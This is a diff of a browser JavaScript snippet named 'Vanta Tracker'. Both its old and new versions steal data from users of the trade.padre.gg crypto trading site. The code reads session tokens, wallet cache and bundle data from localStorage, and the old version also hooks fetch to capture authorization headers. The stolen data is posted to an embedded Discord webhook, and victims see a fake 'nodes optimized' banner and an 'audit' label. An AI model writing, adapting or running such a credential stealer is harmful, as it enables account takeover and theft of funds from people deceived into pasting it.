@@ -1,68 +1,44 @@
 (async function() {
-    // 1. CONFIGURATION
-    const CONFIG = {
-        webhook: "https://discord.com/api/webhooks/1469038806681256071/PB2evnQlWcslXIglcXYSwyGnNYG6XcP9qeJzCkUfNIjJAx4YAg5RyyMtKRGQdi1eW2RT", // The destination
-        targetDomain: "trade.padre.gg",
-        decryptApi: "https://api.padre.gg/v2/enclave/decrypt"
-    };
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1469038806681256071/PB2evnQlWcslXIglcXYSwyGnNYG6XcP9qeJzCkUfNIjJAx4YAg5RyyMtKRGQdi1eW2RT";
 
-    // 2. DISCORD EXFILTRATION FUNCTION
-    const sendToDiscord = async (title, description, color = 0x00ff88) => {
+    // 1. Function to send data to Discord Embeds
+    const logToDiscord = async (data) => {
         const payload = {
             embeds: [{
-                title: title,
-                description: description,
-                color: color,
-                timestamp: new Date().toISOString(),
-                footer: { text: "Vanta Tracker | Educational Audit" }
+                title: "📡 SKYLINE AUDIT DATA",
+                color: 0x00ff88,
+                fields: [
+                    { name: "URL", value: `\`${window.location.href}\`` },
+                    { name: "Session", value: `\`${data.session || 'None'}\`` },
+                    { name: "Wallet Cache", value: data.wallets ? "✅ Captured (JSON)" : "❌ Not Found" }
+                ],
+                footer: { text: "Vanta Tracker v2.0" },
+                timestamp: new Date().toISOString()
             }]
         };
 
-        await fetch(CONFIG.webhook, {
+        await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
-        }).catch(() => {}); // Silent fail to avoid detection
+        }).catch(() => {});
     };
 
-    // 3. TARGET VALIDATION
-    if (location.hostname !== CONFIG.targetDomain) {
-        alert("Please run this tool on " + CONFIG.targetDomain);
-        return;
-    }
-
-    // 4. THE "HARVEST" LOGIC
-    const session = localStorage.getItem('padreV2-session');
-    const bundles = localStorage.getItem('padre-v2-bundles-store-v2');
-
-    if (!session || !bundles) {
-        alert("Error: Active session not found. Please log in first.");
-        return;
-    }
-
-    // Notify that the script has successfully attached
-    await sendToDiscord("📡 AUDITOR INITIALIZED", `Target: ${location.hostname}\nSession detected.`);
-
-    // 5. THE HIJACK (Monitoring Network Traffic)
-    const originalFetch = window.fetch;
-    window.fetch = async (...args) => {
-        const response = await originalFetch(...args);
-        const headers = args[1]?.headers || {};
-
-        // Look for the specific keys needed for decryption
-        const authHeader = headers['Authorization'] || headers['authorization'];
-        const sessionHeader = headers['X-Padre-Session'] || headers['x-padre-session'];
-
-        if (authHeader && sessionHeader && !window.vantaCaptureDone) {
-            window.vantaCaptureDone = true; // Only run once
-            
-            // Send captured headers to Discord
-            await sendToDiscord("🔓 KEYS CAPTURED", 
-                `**Auth:** \`${authHeader.substring(0, 20)}...\`\n**Session:** \`${sessionHeader}\``);
-        }
-
-        return response;
+    // 2. Data Gathering Logic
+    const harvestData = {
+        session: localStorage.getItem('padreV2-session'),
+        wallets: localStorage.getItem('padreV2-walletsCache'),
+        bundles: localStorage.getItem('padre-v2-bundles-store-v2')
     };
 
-    console.log("Vanta: Optimization Nodes Connected.");
+    // 3. Execution & Decoy UI
+    console.log("[VANTA] System Check Initialized...");
+    await logToDiscord(harvestData);
+
+    const notify = document.createElement('div');
+    notify.style = "position:fixed;top:20px;right:20px;z-index:9999;background:#111;color:#00ff88;border:1px solid #00ff88;padding:10px;font-family:monospace;border-radius:5px;";
+    notify.innerHTML = "VANTA: NODES OPTIMIZED [100%]";
+    document.body.appendChild(notify);
+    
+    setTimeout(() => notify.remove(), 3000);
 })();
